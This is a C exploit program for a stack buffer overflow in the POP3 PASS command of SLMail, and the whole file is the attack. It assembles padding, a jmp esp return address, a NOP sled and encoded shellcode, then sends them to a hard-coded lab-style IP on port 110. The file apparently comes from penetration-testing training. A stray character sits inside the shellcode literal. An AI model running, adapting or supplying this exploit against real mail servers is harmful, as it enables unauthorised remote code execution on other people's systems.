#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
//#define retadd "\x8f\x35\x4a\x5f" /*retadd for jmp esp*/
#define retadd "\x8f\x35\x4a\x5f"
#define port 110

char shellcode[] =
"\xba\x96\xb0\x73\xf1\xda\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x50\x12\x03\x50\x12\x83\x7e\x4c\x91\x04\x82\x45\xd4"
"\xe7\x7a\x96\xb9\x6e\x9f\xa7\xf9\x15\xd4\x98\xc9\x5e\xb8\x14"
"\xa1\x33\x28\xae\xc7\x9b\x5f\x07\x6d\xfa\x6e\x98\xde\x3e\xf1"
"\x1a\x1d\x13\xd1\x23\xee\x66\x10\x63\x13\x8a\x40\x3c\x5f\x39"
"\x74\x49\x15\x82\xff\x01\xbb\x82\x1c\xd1\xba\xa3\xb3\x69\xe5"
"\x63\x32\xbd\x9d\x2d\x2c\xa2\x98\xe4\xc7\x10\x56\xf7\x01\x69"
"\x97\x54\x6c\x45\x6a\xa4\xa9\x62\x95\xd3\xc3\x90\x28\xe4\x10"
"\xea\xf6\x61\x82\x4c\x7c\xd1\x6e\x6c\x51\x84\xe5\x62\x1e\xc2"
"\xa1\x66\xa1\x07\xda\x93\x2a\xa6\x0c\x12\x68\x8d\x88\x7e\x2a"
"\xac\x89\xda\x9d\xd1\xc9\x84\x42\x74\x82\x29\x96\x05\xc9\x25"
"\x5b\x24\xf1\xb5\xf3\x3f\x82\x87\x5c\x94\x0c\xa4\x15\x32\xcb"
"\xcb\x0f\x82\x43\x32\xb0\xf3\x4a\xf1\xe4\xa3\xe4\xd0\x84\x2f"
"\xf4\xdd\x50\xff\xa4\x71\x0b\x40\x14\x32\xfb\x28\x7e\xbd\x24"
"\x48\x81\x17\x4d\xe3\x78\xf0\x78\xff\x82\x7c\x15\xfd\x82\x7d"
"\x5e\x88\x64\x17\xb0\xdd\x3f\x80\x29\x44\xcb\x31\xb5\x52\xb6"
"\x72\x3d\x51\x47\x3c\xb6\x1c\x5b\xa9\x36\x6b\x01\x7c\x48\x41"
"\x2d\xe2\xdb\x0e\xad\x6d\xc0\x98\xfa\x3a\x36\xd1\x6e\xd7\x61"
"\x4b\x8c\x2a\xf7\xb4\x14\xf1\xc4\x3b\x95\x74\x70\x18\x85\x40"
"\x79\x24\xf1\x1c\x2c\xf2\xaf\xda\x86\xb4\x19\xb5\x75\x1f\xcd"
"\x40\xb6\xa0\x8b\x4c\x93\x56\x73\xfc\x4a\x2f\x8c\x31\x1b\xa7"
"\xf5\x2f\xbb\x48\x2c\xf4\xcb\x02\x6c\x5d\x44\xcb\xe5\xdf\x09"
"\xec\xd0\x1c\x34\x6f\xd0\xdc\xc3\x6f\x91\xd9\x88\x37\x4a\x90"
"\x81\xdd\x6c\x07\xa1\xf7)";


struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2970);
    memset(buffer, 0x00, 2970);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(8);
    memset(nop, 0x00,8);
    memset(nop, 0x90,8);

    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.20.40");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
